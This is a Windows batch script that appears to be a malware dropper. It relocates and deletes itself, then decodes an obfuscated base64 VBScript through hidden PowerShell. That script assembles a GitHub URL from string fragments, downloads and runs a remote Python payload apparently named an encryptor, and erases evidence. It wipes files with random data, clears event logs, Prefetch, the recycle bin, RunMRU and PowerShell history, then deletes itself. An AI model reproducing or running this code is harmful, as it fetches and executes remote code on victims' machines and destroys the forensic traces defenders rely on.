@echo off
setlocal enabledelayedexpansion

if not "%1"=="w" (
    set "tb=%TEMP%\~w!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!tb!" >nul 2>&1
    if exist "!tb!" (
        start /b cmd /c call "!tb!" w
        timeout /t !RANDOM:~-1! /nobreak >nul
        del /f /q "%~f0" >nul 2>&1
    )
    exit /b
)

set "vf=%TEMP%\~i!RANDOM!.vbs"

powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$a='T24gRXJyb3IgUmVzdW1lIE5leHQKUmFuZG9taXplClNldCBmc289Q3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpClNldCBzaD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQpTZXQgd249Q3JlYXRlT2JqZWN0KCJXU2NyaXB0Lk5ldHdvcmsiKQoKc3A9V1NjcmlwdC5TY3JpcHRGdWxsTmFtZQpzbj1mc28uR2V0RmlsZU5hbWUoc3ApCnNkPWZzby5HZXRQYXJlbnRGb2xkZXJOYW1lKHNwKQp0Yj1zaC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVURU1QJSIpCgpJZiBJblN0cihMQ2FzZShzcCksTENhc2UodGIpKT4wIEFuZCBMQ2FzZShzbik9ImMudmJzIiBUaGVuCiAgICBleHA9IiIKICAgIEZvciBFYWNoIGYgSW4gZnNvLkdldEZvbGRlcihzZCkuRmlsZXMKICAgICAgICBJZiBMQ2FzZShSaWdodChmLk5hbWUsNCkpPSIuZXhlIiBUaGVuCiAgICAgICAgICAgIGV4cD1mLlBhdGgKICAgICAgICAgICAgRXhpdCBGb3IKICAgICAgICBFbmQgSWYKICAgIE5leHQKICAgIAogICAgcDFhPSJodCIKICAgIHAxYj0idHBzOiIKICAgIHAxYz0iLy8iCiAgICBwMmE9ImdpdCIKICAgIHAyYj0iaHViIgogICAgcDJjPSIuY28iCiAgICBwMmQ9Im0iCiAgICBwM2E9Ii9iciIKICAgIHAzYj0iYXlhIgogICAgcDNjPSJuamgiCiAgICBwM2Q9Im9hbiIKICAgIHAzZT0iY2UyIgogICAgcDNmPSItY28iCiAgICBwM2c9ImxsYSIKICAgIHAzaD0iYiIKICAgIHA0YT0iL2VuIgogICAgcDRiPSJjcmkiCiAgICBwNGM9InB0YSIKICAgIHA0ZD0iZG8iCiAgICBwNGU9Ii9hcmMiCiAgICBwNGY9ImhpdmUiCiAgICBwNWE9Ii9yZSIKICAgIHA1Yj0iZnMiCiAgICBwNWM9Ii9oZWEiCiAgICBwNWQ9ImRzIgogICAgcDVlPSIvbWEiCiAgICBwNWY9ImluLnoiCiAgICBwNWc9ImlwIgogICAgCiAgICBydT1wMWEmcDFiJnAxYyZwMmEmcDJiJnAyYyZwMmQmcDNhJnAzYiZwM2MmcDNkJnAzZSZwM2YmcDNnJnAzaCZwNGEmcDRiJnA0YyZwNGQmcDRlJnA0ZiZwNWEmcDViJnA1YyZwNWQmcDVlJnA1ZiZwNWcKICAgIHpwPXNkJiJccmUuemlwIgogICAgZXA9c2QmIlxleCIKICAgIAogICAgZDFhPSIkcD0iCiAgICBkMWI9Ik5ldy0iCiAgICBkMWM9Ik9iaiIKICAgIGQxZD0iZWN0IC1Db20iCiAgICBkMWU9Ik1TIgogICAgZDFmPSJYTUwyLlNlciIKICAgIGQxZz0idmVyWE1MSFQiCiAgICBkMWg9IlRQOyIKICAgIGQyYT0iJHAuT3BlbigiCiAgICBkMmI9IidHRSciLCciCiAgICBkMmM9cnUKICAgIGQyZD0iJyxGYWxzZSk7IgogICAgZDNhPSIkcC5TZXRSZXF1ZXN0SGVhZGVyKCdVc2VyLUEiCiAgICBkM2I9ImdlbnQnLCdNb3ppbGxhLzUuMCcpOyIKICAgIGQ0YT0iJHAuU2VuZCgpOyIKICAgIGQ1YT0iW1N5c3RlbS5JTy5GaWxlXT06V3JpdGVBbGxCeXRlcygiCiAgICBkNWI9InpwCiAgICBkNWM9IiwkcC5yZXNwb25zZUJvZHkpOyIKICAgIGQ2YT0iRXhwYW5kLUFyY2hpdmUgLVBhdGggIgogICAgZDZiPXpwCiAgICBkNmM9IiAtRGVzdGluYXRpb25QYXRoICIKICAgIGQ2ZD1lcAogICAgZDZlPSIgLUZvcmNlIgogICAgCiAgICBwZD0icG93ZXJzaGVsbC5leGUgLXcgaCAtbm9wIC1jICIKICAgIGNtZD1wZCYiIiImZDFhJmQxYiZkMWMmZDFkJiJvYmplY3QoIiZkMWUmZDFmJmQxZyZkMWgmZDJhJmQyYiZkMmMmZDJkJmQzYSZkM2ImZDRhJiJJZiAoJHAuU3RhdHVzIC1lcSAyMDApIHsiJmQ1YSYiJyImZDViJiInIiZkNWMmZDZhJiInIiZkNmImIiciJmQ2YyYiJyImZDZkJiInIiZkNmUmIn0iJiIiIgogICAgCiAgICBzaC5SdW4gY21kLDAsMQogICAgV1NjcmlwdC5TbGVlcCA4MDAwCiAgICAKICAgIElmIE5vdCBmc28uRmlsZUV4aXN0cyh6cCkgVGhlbgogICAgICAgIFdTY3JpcHQuUXVpdAogICAgRW5kIElmCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgCiAgICBycD0iIgogICAgbHA9IiIKICAgIHBwPSIiCiAgICAKICAgIElmIGZzby5Gb2xkZXJFeGlzdHMoZXApIFRoZW4KICAgICAgICBGb3IgRWFjaCBzZiBJbiBmc28uR2V0Rm9sZGVyKGVwKS5TdWJGb2xkZXJzCiAgICAgICAgICAgIElmIExDYXNlKHNmLk5hbWUpPSJlbmNyaXB0YWRvLW1haW4iIFRoZW4KICAgICAgICAgICAgICAgIHJwPXNmLlBhdGgKICAgICAgICAgICAgICAgIGxwPXJwJiJcbGF1bmNoZXIucHkiCiAgICAgICAgICAgICAgICBwcD1ycCYiXHB5dGhvbl9wb3J0YWJsZVxweXRob24uZXhlIgogICAgICAgICAgICAgICAgRXhpdCBGb3IKICAgICAgICAgICAgRW5kIElmCiAgICAgICAgTmV4dAogICAgRW5kIElmCiAgICAKICAgIElmIHJwPD4iIiBBbmQgZnNvLkZpbGVFeGlzdHMobHApIEFuZCBmc28uRmlsZUV4aXN0cyhwcCkgVGhlbgogICAgICAgIHNoLkN1cnJlbnREaXJlY3Rvcnk9cnAKICAgICAgICBjbD0iIiImcHAmIiIiICIiIiZscCYiIiIKICAgICAgICBzaC5SdW4gY2wsMCwwCiAgICAgICAgV1NjcmlwdC5TbGVlcCAxMDAwMAogICAgRW5kIElmCiAgICAKICAgIElmIGV4cDw+IiIgQW5kIGZzby5GaWxlRXhpc3RzKGV4cCkgVGhlbgogICAgICAgIEZvciBpPTEgVG8gMwogICAgICAgICAgICBTZXQgZnc9ZnNvLk9wZW5UZXh0RmlsZShleHAsMikKICAgICAgICAgICAgRm9yIGo9MSBUbyAxMDAwCiAgICAgICAgICAgICAgICBmdy5Xcml0ZUxpbmUgU3RyaW5nKDgwLENocihJbnQoUm5kKjI2KSs2NSkpCiAgICAgICAgICAgIE5leHQKICAgICAgICAgICAgZncuQ2xvc2UKICAgICAgICAgICAgV1NjcmlwdC5TbGVlcCAyMDAKICAgICAgICBOZXh0CiAgICAgICAgZnNvLkRlbGV0ZUZpbGUgZXhwLDEKICAgIEVuZCBJZgogICAgCiAgICBXU2NyaXB0LlNsZWVwIDIwMDAKICAgIAogICAgSWYgZnNvLkZpbGVFeGlzdHMoenApIFRoZW4KICAgICAgICB6cz1mc28uR2V0RmlsZSh6cCkuU2l6ZQogICAgICAgIElmIHpzPjAgQW5kIHpzPDEwMDAwMDAwMCBUaGVuCiAgICAgICAgICAgIEZvciBwcz0xIFRvIDMKICAgICAgICAgICAgICAgIHBzaD0icG93ZXJzaGVsbC5leGUgLXcgaCAtYyAiIiIgJF9iPU5ldy1PYmplY3QgYnl0ZVtdICImenMmIjskX3I9TmV3LU9iamVjdCBSYW5kb207JF9yLk5leHRCeXRlcygkX2IpO1tJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygnIiZ6cCYiJywkX2IpICIiIiIKICAgICAgICAgICAgICAgIHNoLlJ1biBwc2gsMCwxCiAgICAgICAgICAgICAgICBXU2NyaXB0LlNsZWVwIDUwMAogICAgICAgICAgICBOZXh0CiAgICAgICAgRW5kIElmCiAgICAgICAgZnNvLkRlbGV0ZUZpbGUgenAsMQogICAgRW5kIElmCiAgICAKICAgIHNoLlJlZ0RlbGV0ZSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxSdW5NUlVcIgogICAgCiAgICBwY2w9InBvd2Vyc2hlbGwuZXhlIC13IGggLWMgIiIiJF89J1NpbGVudGx5Q29udGludWUnOyIKICAgIHBjbD1wY2wmIlJtIC1GIC1FYSAwICdDOlxXaW5kb3dzXFByZWZldGNoXCoucGYnOyIKICAgIHBjbD1wY2wmIkNsZWFyLVJlY3ljbGVCaW4gLUYgLUNvbmY6JGY7IgogICAgcGNsPXBjbCYid2V2dHV0aWwgY2wgQXBwIDI+JG47IgogICAgcGNsPXBjbCYid2V2dHV0aWwgY2wgU3lzIDI+JG47IgogICAgcGNsPXBjbCYiUm0gLUYgLUVhIDAgJyRlbnY6QVBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFBvd2VyU2hlbGxcUFNSZWFkTGluZVxDb25zb2xlSG9zdF9oaXN0b3J5LnR4dCciCiAgICBwY2w9cGNsJiIiIiIKICAgIHNoLlJ1biBwY2wsMCwxCiAgICAKICAgIFdTY3JpcHQuU2xlZXAgMjAwMAogICAgY2JwPXNkJiJcY2IuYmF0IgogICAgU2V0IGZjPWZzby5DcmVhdGVUZXh0RmlsZShjYnAsMSkKICAgIGZjLldyaXRlTGluZSAiQGVjaG8gb2ZmIgogICAgZmMuV3JpdGVMaW5lICJ0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bCIKICAgIGZjLldyaXRlTGluZSAidGFza2tpbGwgL2YgL2ltIHdzY3JpcHQuZXhlID5udWwgMj4mMSIKICAgIGZjLldyaXRlTGluZSAiZGVsIC9mIC9xICIiIiZzcCYiIiIgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICJjZCAvZCAlVEVNUCUiCiAgICBmYy5Xcml0ZUxpbmUgInJtZGlyIC9zIC9xICIiIiZzZCYiIiIgPm51bCAyPiYxIgogICAgZmMuV3JpdGVMaW5lICIoZ290bykgMj5udWwgJiBkZWwgL2YgL3EgIiIlfjBmIiIgJiBleGl0IgogICAgZmMuQ2xvc2UKICAgIAogICAgc2guUnVuICJjbWQuZXhlIC9jICIiIiZjYnAmIiIiIiwwLDAKICAgIFdTY3JpcHQuUXVpdAogICAgCkVsc2UKICAgIHRpZD0ic3lzXyImSW50KFJuZCo5OTk5OTkrMTAwMDAwKQogICAgdHc9dGImIlwiJnRpZAogICAgZnNvLkNyZWF0ZUZvbGRlciB0dwogICAgCiAgICB2dD10dyYiXGMudmJzIgogICAgZnNvLkNvcHlGaWxlIHNwLHZ0LDEKICAgIAogICAgc2guUnVuICJ3c2NyaXB0LmV4ZSAiIiImdnQmIiIiIC8vQiAvL05vbG9nbyIsMCwwCiAgICBXU2NyaXB0LlNsZWVwIDEwMDAKICAgIAogICAgZnNvLkRlbGV0ZUZpbGUgc3AsMQogICAgV1NjcmlwdC5RdWl0CiAgICAKRW5kIElm'; ^
$b=[Convert]::FromBase64String($a); ^
[IO.File]::WriteAllBytes('%vf%',$b)"

timeout /t !RANDOM:~-1! /nobreak >nul

if exist "%vf%" (
    start /b wscript.exe "%vf%" //B //Nologo
    timeout /t !RANDOM:~-1! /nobreak >nul
)

del /f /q "%~f0" >nul 2>&1
exit